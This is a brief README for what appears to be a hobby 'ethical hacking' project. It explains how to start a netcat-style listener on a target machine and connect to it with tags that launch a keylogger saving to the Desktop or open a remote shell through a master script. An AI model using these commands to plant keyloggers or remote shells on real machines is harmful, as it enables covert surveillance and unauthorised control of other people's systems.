# Ethical_Hacking

HOW TO USE:
on target machine: python -m netcat -t <local IP> -p 5555 -l -c

connect: nc <local IP> 5555 <tag>
tags: 	-k, keylogger, saves to ~/Desktop/file.logs
	-rs, remoteshell, start a remoteshell

remoteshell: run on host machine the script remoteshell_master.py. this is included in the package remoteshell

